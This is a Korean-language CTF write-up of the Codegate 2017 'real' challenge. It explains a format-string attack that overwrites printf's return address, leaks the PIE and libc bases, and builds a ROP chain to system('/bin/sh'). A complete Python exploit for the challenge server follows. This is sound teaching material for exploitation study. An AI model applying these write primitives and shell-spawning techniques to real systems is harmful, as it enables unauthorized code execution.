---
layout: post
title: codegate 2017 real writeup(KR)
category: writeup
---

KR version

오랜만에 코드게이트 대회에 KAIST GoN으로 나갔다. real 한문제를 풀어서 190점으로 4등을 했다!

real문제는 stack offset을 알려주고, 임의의 한 바이트 (어차피 stack밖에 몰라서 stack 중 한바이트)를 알려준다.

그 후에는 15번 printf를 해주는데 첫번째 argument string과 두번째 argument를 모두 지정해줄수 있다!

하지만 안타까운 점은 stack값을 모두 0으로 바꾸는데다가 printf 결과를 보여주지 않고 ( fd 1을 /dev/null로 리다이렉션 ), printf후에 바로 exit(0)을 한다는 점이다.

게다가 pie이고 full relo라서 exit 포인터를 바꿀 수도 없다.

다음이 문제의 대략적인 구조이다.

```c
  printf("Reference Stack Pointer is %p\n", &i);
  ...
  printf("Which Address Do you Want to See? -->");
  scanf("%lld", &v1);
  ...
  printf("The value is %02x\n", *v1);
  for ( int i = 0; i <= 14; ++i )
  {
    printf("[%lld/%d] Input the format string -->", i + 1, 15);
    fgets(&format[128 * i], 127, stdin);
    printf("[%lld/%d] Input the Argument 1 -->", i + 1, 15);
    scanf("%lld", &args[i]);
  }  
  char* j = &stack_variable;
  puts("Erase the Stack");
  fd = open("/dev/urandom", 0);
  while ( read(fd, j, 1) == 1 )
  {
    *j = 0;
    j = j + 1;
  }
  puts("Now, You can not see output");
  ...
  fd = open("/dev/null", 1);
  dup2(fd, 1);
  for ( fd = 0; fd <= 14; ++fd )
    printf(&format[128 * fd], args[fd]);
  close(fd);
  exit(0);
  ...
```

가장 먼저 시도해야 할 것은 pie leak이다. 스택을 조작해 ROP 등을 하기 위해서는 pie base 값을 알아야 한다.

stack offset을 알기 때문에 format string bug를 통해 printf가 실행되고 자신의 리턴 값을 바꾸어 dup2를 실행하도록 시도했다.

```python
want_to_return_1 = (0x0b98 + pie_crit * 0x100 - 0xc00 + 0x10000) & 0xffff
give_format_string( "%" + ("%d" % want_to_return_1) + "c%1$hn", base_ptr - 8 * 1)
for i in range(14):
    give_format_string("a",1)
```

printf의 리턴 주소는 어차피 for문 내부 (pie 주위)를 가리키고 있기 때문에, %1$hn을 사용하여 하위 2바이트만 바꿔주어 원하는 pie 주소로 점프 가능하게 했다.

pie_crit은 처음에 1바이트를 알려줄 때 pie의 밑에서 두번째 바이트를 가져왔다. 0xb98은 dup2(fd,1)을 실행하기 전의 offset이다.

이렇게 하면 fd가 0일 때 printf가 실행되고 dup2(0,1)이 실행되어 stdin으로 값이 들어오는 것을 확인할 수 있었다.

그러나, dup2로 한번 점프한 후에도 printf의 인자는 그대로이기 때문에 무한루프에 빠지게 되어 이후를 진행할 수 없었다.

이를 위해 다음과 같은 계획을 세웠다.

```
1. 첫 printf에서 return value를 조작해 main으로 점프한다. (main을 시작할때 rsp를 0x18 뺌)
2. 그럼 rsp + 0x18에 main위치가 저장되어 있고, 이제 다시 printf를 3번 해서 fd=2로 만든다.
   2-1. printf를 3번 하던 중에 rsp+0x18 (주어진 stack pointer를 통해 stack 주소를 계산할 수 있음) 의 하위 2바이트를 바꿔 dup2(fd,1)로 가게 바꾼다.
   2-2. 마지막 printf에서 rsp를 바꿔서 pop pop pop return의 주소로 바꾼다.
   2-3. 그러면 그 루프에서는 return address가 pop pop pop return의 주소가 되어 dup2(fd,1)이 실행되고 다시 printf 루프가 실행된다.
   2-4. 하지만 두번째 루프에서는 return address + 0x18의 주소가 바뀌기 때문에 무한루프에 빠지지 않는다.
3. 그럼 3번째 printf에서 dup2로 점프하지 않고 15번 printf가 진행되는데, 이때 pie_base leak을 하고 마지막 15번째 printf에서 다시 main으로 돌아간다.
```

이렇게 해서 pie_base 값을 얻고 다시 처음부터 시작할 수 있게 되었다.

이제 처음에 임의의 위치 1바이트를 알려주는 기능이 있고, 다시 처음으로 돌아올 수 있기 때문에

위의 방법을 반복해서 사용하여 원하는 모든 메모리의 값을 구했다. 익스플로잇 코드의 get_quad에 구현되어 있다.

이제 got_dup2, got_printf, got_read 의 값을 얻어 libc database에 검색해 libc_binsh 스트링의 주소와 libc_system의 주소를 얻고,

마지막으로 printf 15번을 할 때 pop_rdi_return, libc_binsh, libc_system을 순서대로 스택에 넣는다.

printf 한번을 할 때 인자 하나와 string 하나를 줄 수 있기 때문에 printf("%1234c%1$hn", address) 로 임의의 2바이트를 원하는 위치에 쓸 수 있다.

따라서 위의 rop gadget을 만들 때 4 * 3 = 12번의 printf를 수행하고

13번째 printf에서 자신의 리턴 주소를 retn;이 있는 주소로 바꿔 rop를 트리거하였다.

system("/bin/sh")가 실행된 후에도 fd 1이 /dev/null에 매핑되있으므로 들어가서 "sh 1<&2"를 한번 실행해준다.

다음은 exploit 코드이다. ( 매우 길고 문제 서버에 대해서만 동작하기 때문에 참고용으로만 써주시길.. )

```python
#!/usr/bin/python

import pwnbox
import struct
import sys

#p = pwnbox.pipe.ProcessPipe('./real')
p = pwnbox.pipe.SocketPipe('200.200.200.106', 44444)

def get_stack_pointer():
    p.read_until('Stack Pointer is ')
    ans = int(p.read_until('\n'), 16)
    return ans

def get_pie_crit(x):
    p.read_until('-->')
    p.write('%d\n' % x)
    p.read_until('The value is ')
    ans = int(p.read_until('\n'), 16)
    return ans

def give_format_string(st, n):
    p.read_until('Input the format string -->')
    p.write(st+'\n')
    p.read_until(' -->')
    p.write("%d\n" % n)

base_ptr = get_stack_pointer()
pie_crit = get_pie_crit(base_ptr - 0x7fffffffe590 + 0x7fffffffe589)
want_to_return_1 = (0x0b98 + pie_crit * 0x100 - 0xc00 + 0x10000) & 0xffff
give_format_string( "%" + ("%d" % want_to_return_1) + "c%1$hn", base_ptr - 8 * 1)
for i in range(14):
    give_format_string("a",1)

want_to_return_main = (0x0b9c + pie_crit * 0x100 - 0xc00 + 0x10000) & 0xffff
want_to_return_3 = (0x0d8c + pie_crit * 0x100 - 0xc00 + 0x10000) & 0xffff
p.write("%d\n" % (base_ptr - 0x7fffffffe590 + 0x7fffffffe589))
p.write("%" + ("%d" % want_to_return_3) + "c%1$hn\n")
p.write("%d\n" % (base_ptr - 8 * 1))
p.write("%" + ("%d" % want_to_return_main) + "c%1$hn\n")
p.write("%d\n" % (base_ptr - 8 * 4 ))
for i in range(13):
    p.write("a\n")
    p.write("1\n")

p.write("%d\n" % (base_ptr - 0x7fffffffe590 + 0x7fffffffe589))
want_to_return_2 = (0x0EA0 + pie_crit * 0x100 - 0xc00 + 0x10000) & 0xffff
p.write("%" + ("%d" % want_to_return_2) + "c%1$hn\n")
p.write("%d\n" % (base_ptr - 8 * 4 ))
p.write("PIEGET\n")
p.write("0\n")
p.write("%s\n")
p.write("%d\n" % (base_ptr - 8))
for i in range(11):
    p.write("a\n")
    p.write("1\n")
p.write("%" + ("%d" % want_to_return_main) + "c%1$hn\n")
p.write("%d\n" % (base_ptr - 8 * 1))

p.read_until("PIEGET\n")
pie_base = struct.unpack("<Q",p.read_byte(6).ljust(8,'\x00'))[0] - 0xe0a

pie_main = pie_base + 0xb98
p.read_until("-->")
#print "%x" % pie_base

def leak(x):
    p.write("%d\n" % x)
    p.read_until('The value is ')
    ans = int(p.read_until('\n'), 16)

    want_to_return_1 = (0x0b98 + pie_crit * 0x100 - 0xc00 + 0x10000) & 0xffff
    give_format_string( "%" + ("%d" % want_to_return_1) + "c%1$hn", base_ptr - 8 * 1)
    for i in range(14):
        give_format_string("a",1)

    want_to_return_main = (0x0b9c + pie_crit * 0x100 - 0xc00 + 0x10000) & 0xffff
    want_to_return_3 = (0x0d8c + pie_crit * 0x100 - 0xc00 + 0x10000) & 0xffff
    p.write("%d\n" % (base_ptr - 0x7fffffffe590 + 0x7fffffffe589))
    p.write("%" + ("%d" % want_to_return_3) + "c%1$hn\n")
    p.write("%d\n" % (base_ptr - 8 * 1))
    p.write("%" + ("%d" % want_to_return_main) + "c%1$hn\n")
    p.write("%d\n" % (base_ptr - 8 * 4 ))
    for i in range(13):
        p.write("a\n")
        p.write("1\n")

    p.write("%d\n" % (base_ptr - 0x7fffffffe590 + 0x7fffffffe589))
    want_to_return_2 = (0x0EA0 + pie_crit * 0x100 - 0xc00 + 0x10000) & 0xffff
    p.write("%" + ("%d" % want_to_return_2) + "c%1$hn\n")
    p.write("%d\n" % (base_ptr - 8 * 4 ))
    p.write("PIEGET\n")
    p.write("0\n")
    p.write("%s\n")
    p.write("%d\n" % (base_ptr - 8))
    for i in range(11):
        p.write("a\n")
        p.write("1\n")
    p.write("%" + ("%d" % want_to_return_main) + "c%1$hn\n")
    p.write("%d\n" % (base_ptr - 8 * 1))

    p.read_until("PIEGET\n")
    pie_base = struct.unpack("<Q",p.read_byte(6).ljust(8,'\x00'))[0] - 0xe0a
    p.read_until("-->")
    return ans

def get_quad(x):
    s = ''
    for i in range(8):
        s = s + chr(leak(x+i))
    return struct.unpack("<Q",s)[0]
got_dup2 = pie_base + 0x201f90
#got_printf = pie_base + 0x201f98
#got_read = pie_base + 0x201fa8

libc_dup2 =  get_quad(got_dup2)

libc_base = libc_dup2 - 0xf6d90
libc_system = libc_base + 0x45390
libc_binsh = libc_base + 0x18c177
#libc_printf = get_quad(got_printf)
#libc_read = get_quad(got_read)

print "%x %x %x" % (libc_dup2, libc_system, libc_binsh)

p.write("%d\n" % libc_base)
poprdiret = pie_base + 0xea3

def write_quad(x,pt):
    give_format_string( "%" + ("%d" % (x & 0xffff)) + "c%1$hn", pt)
    give_format_string( "%" + ("%d" % ((x & 0xffff0000) >> 16)) + "c%1$hn", pt+2)
    give_format_string( "%" + ("%d" % ((x & 0xffff00000000) >> 32)) + "c%1$hn", pt+4)
    if(((x & 0xffff000000000000) >> 48) != 0):
        give_format_string( "%" + ("%d" % ((x & 0xffff000000000000) >> 48)) + "c%1$hn", pt+6)
    else:
        give_format_string("%1$hn", pt+6)
    return 4

write_quad(poprdiret, base_ptr)
write_quad(libc_binsh, base_ptr + 8)
write_quad(libc_system, base_ptr + 16)

give_format_string( "%" + ("%d" % ((pie_base + 0xEA4) & 0xffff)) + "c%1$hn", base_ptr - 8 )

for i in range(2):
    give_format_string("a",1)

p.write("sh 1<&2\n")
p.interact()
```